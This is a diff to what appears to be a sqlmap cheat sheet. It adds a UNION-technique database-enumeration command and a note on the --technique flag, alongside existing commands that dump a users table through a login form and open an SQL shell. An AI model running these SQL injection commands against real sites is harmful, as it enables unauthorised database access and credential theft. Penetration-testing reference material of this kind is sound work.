@@ -20,6 +20,9 @@
 <pre>sqlmap -u "http://testsite.com/login.php" –method "POST" –data "username=admin&password=admin&submit=Submit" -D social_mccodes -T users –dump
 </pre>
 
+**Add Technique**
+<pre>sqlmap -u "http://testsite.com/home.php?id=" --dbs --technique=U -p "id"</pre>
+
 **Get SQL Shell**
 <pre>sqlmap --dbms=mysql -u "http://testsite.com/login.php" --sql-shell </pre>
 
@@ -36,3 +39,5 @@
 **--referer**
 
 **--headers**
+
+**--technique= U | B | E**
